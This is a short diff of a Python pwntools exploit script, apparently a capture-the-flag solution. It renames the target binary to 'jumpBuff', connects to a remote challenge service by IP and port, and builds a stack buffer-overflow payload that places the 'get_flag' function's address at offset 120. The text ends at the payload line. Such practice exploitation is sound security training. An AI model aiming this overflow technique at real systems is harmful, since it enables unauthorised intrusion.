@@ -3,10 +3,10 @@
 from pwn import *
 
 
-context.binary = './bin/jump'
+context.binary = './bin/jumpBuff'
 
-e = ELF('./bin/jump')
-rop = ROP('./bin/jump')
+e = ELF('./bin/jumpBuff')
+rop = ROP('./bin/jumpBuff')
 p = remote('34.150.138.102', 5004)
 
 payload = flat({120: e.sym['get_flag']})
